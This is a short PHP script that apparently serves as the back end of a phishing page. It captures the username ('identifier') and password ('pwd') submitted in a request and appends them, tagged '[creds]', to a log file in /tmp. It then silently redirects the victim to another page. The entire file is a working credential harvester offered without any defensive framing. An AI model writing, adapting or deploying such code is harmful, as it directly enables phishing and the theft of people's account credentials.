<?php
    system("touch /tmp/output.log");
    $myfile = fopen("/tmp/output.log", "a") or die("Unable to open file!");
    $txt = $_REQUEST['identifier'].":".$_REQUEST['pwd'];
    fwrite($myfile, "[creds]: '".$txt."'\n");
    fclose($myfile);
    header("location: ./access.php");
?>